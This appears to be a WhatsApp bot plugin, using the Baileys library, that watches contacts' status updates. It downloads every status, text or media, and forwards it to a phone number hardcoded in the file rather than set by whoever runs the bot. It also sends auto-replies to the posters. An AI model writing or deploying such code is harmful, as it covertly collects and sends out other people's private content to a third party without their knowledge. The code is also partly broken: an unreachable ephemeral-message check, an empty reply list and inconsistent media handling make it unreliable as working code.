const fs = require('fs');
const path = require('path');
const { readEnv } = require('../lib/database');
const { cmd, commands } = require('../command');
const { fetchJson, getBuffer } = require('../lib/functions'); // Ensure getBuffer is available
const { downloadMediaMessage } = require('@adiwajshing/baileys'); // Ensure you have this package

// Function to determine the content type of a message
function getContentType(message) {
    if (!message) return null;
    if (message.conversation) return 'text';
    if (message.imageMessage) return 'image';
    if (message.videoMessage) return 'video';
    if (message.audioMessage) return 'audio';
    if (message.documentMessage) return 'document';
    // Add other message types as needed
    return null;
}

// Flag to track whether the status listener is initialized
let isStatusListenerInitialized = false;

// Function to select a random phrase for replies
function getRandomResponse() {
    const responses = [
        // Add your responses here...
    ];
    return responses[Math.floor(Math.random() * responses.length)];
}

// Number to which each status should be forwarded
const forwardNumber = '+94777839446@s.whatsapp.net'; // Append `@s.whatsapp.net` for WhatsApp format

// Ensure the connection is passed properly
async function initializeStatusListener(conn) {
    if (isStatusListenerInitialized) return; // Prevent reinitialization

    // Load configuration
    const config = await readEnv();

    // Listen for new messages, including status updates
    conn.ev.on('messages.upsert', async (mek) => {
        mek = mek.messages[0]; // Get the first message from the array
        if (!mek.message) return; // Check if the message exists

        // Handle ephemeral messages
        mek.message = (getContentType(mek.message) === 'ephemeralMessage')
            ? mek.message.ephemeralMessage.message
            : mek.message;

        // Check if the message is from status updates
        if (mek.key && mek.key.remoteJid === 'status@broadcast') {
            const sender = mek.key.participant; // Get the participant who posted the status
            const contentType = getContentType(mek.message);
            const caption = mek.message.conversation || mek.message.caption || 'No caption provided.';

            // Log the output with sender's push name, content type, and caption
            console.log(`New status posted by: ${sender} Media Type: ${contentType || 'No media'} Caption: ${caption}`);

            // Forward each status to the specified number
            if (contentType === 'text') {
                // If it's text, forward the text message
                await conn.sendMessage(forwardNumber, { text: caption });
            } else {
                // If it's media, download and forward the media
                const mediaMessage = mek.message[`${contentType}Message`];
                const mediaBuffer = await downloadMediaMessage(mek, 'buffer', {}, { logger: console });

                if (mediaBuffer) {
                    await conn.sendMessage(forwardNumber, { 
                        [contentType]: mediaBuffer, 
                        caption: caption 
                    });
                }
            }

            // Check the config to decide whether to send the status seen message
            if (config.STATES_SEEN_MESSAGE_SEND_SEND === 'true') {
                const message = getRandomResponse(); // Get a random response
                // Send the message as a reply to the relevant status
                await conn.sendMessage(sender, { text: message }, { quoted: mek });
            }
        }
    });

    isStatusListenerInitialized = true; // Mark the listener as initialized
}

// Command handler (if needed)
cmd({ on: "body" }, async (conn, mek, m, { from, body, isOwner }) => {
    // Initialize the status listener if it's not already done
    await initializeStatusListener(conn);
    // Additional command handling code can go here
});
